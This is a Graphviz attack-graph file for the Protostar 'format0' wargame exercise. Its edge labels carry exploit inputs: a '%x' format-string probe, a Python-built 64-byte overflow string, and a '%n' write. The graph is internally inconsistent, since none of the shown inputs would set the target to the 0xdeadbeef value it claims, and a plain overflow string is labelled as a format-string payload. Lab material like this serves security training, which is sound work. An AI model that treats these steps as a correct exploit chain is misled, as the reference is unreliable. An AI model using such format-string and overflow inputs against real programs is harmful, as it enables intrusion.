digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Format Zero"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Short crashing input identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Format-string payload built"];
  node2 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="target overwritten to 0xdeadbeef"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/format0 %x%x%x%x"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/format0 $(python -c 'print \"A\"*64 + \"BBBB\"')"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/format0 AAAAAAAA%n"];
}
